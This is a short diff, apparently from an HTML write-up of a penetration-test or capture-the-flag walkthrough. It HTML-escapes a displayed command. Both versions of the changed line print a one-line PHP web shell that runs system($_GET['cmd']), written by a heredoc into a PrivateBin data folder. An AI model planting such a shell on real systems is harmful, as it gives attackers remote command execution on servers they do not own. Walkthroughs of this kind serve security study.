@@ -164,7 +164,7 @@ uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
 
 <pre>
 cat > /privatebin-data/data/pwn.php << 'EOF'
-<?php system($_GET['cmd']); ?>
+&lt;?php system($_GET['cmd']); ?&gt;
 EOF
 </pre>
 
